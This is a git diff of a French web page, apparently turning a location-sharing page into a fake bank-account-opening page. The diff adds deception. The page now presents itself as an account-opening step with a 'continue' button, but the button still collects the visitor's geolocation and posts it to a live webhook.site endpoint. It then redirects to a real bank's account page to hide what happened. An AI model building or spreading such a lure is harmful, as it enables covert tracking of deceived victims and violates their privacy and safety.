@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Partage de localisation</title>
+  <title>Ouverture de compte bancaire</title>
 </head>
 <body>
   <h1>Bonjour - 👋</h1>
-  <p>Veuillez cliquer sur le bouton ci-dessous pour partager votre position.</p>
-  <button onclick="getLocation()">📍 Partager ma position</button>
+  <p>Ouverture de compte bancaire</p>
+  <button style="background-color: #ff6f09;" onclick="getLocation()">Continuer pour ouvrir mon compte bancaire</button>
   <p id="result"></p>
 
   <script>
@@ -26,11 +26,12 @@
         `Position reçue : Latitude ${lat}, Longitude ${lon}`;
 
       // Envoie vers ton webhook ou ton email via service externe
-      fetch("https://webhook.site/TON_ID_PERSONNEL", {
+      fetch("https://webhook.site/b03e51c0-21dd-446a-a69a-2a20af217999", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: lat, longitude: lon })
       });
+      window.location.replace("https://ebank.gtbankci.com/OpenAccount/")
     }
 
     function showError(error) {
